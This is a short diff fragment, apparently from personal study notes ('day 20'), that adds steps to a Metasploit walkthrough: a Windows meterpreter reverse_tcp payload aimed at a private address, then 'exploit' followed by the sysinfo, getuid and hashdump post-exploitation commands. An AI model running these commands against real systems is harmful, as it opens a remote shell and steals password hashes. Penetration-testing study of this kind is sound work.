@@ -32,3 +32,12 @@ show options
 set RHOSTS 192.168.1.10
 set payload windows/x64/meterpreter/reverse_tcp
 set LHOST 192.168.1.5
+
+# run the exploit
+exploit
+
+# once successful you get a meterpreter session (day 20)
+sysinfo
+getuid
+hashdump
+```
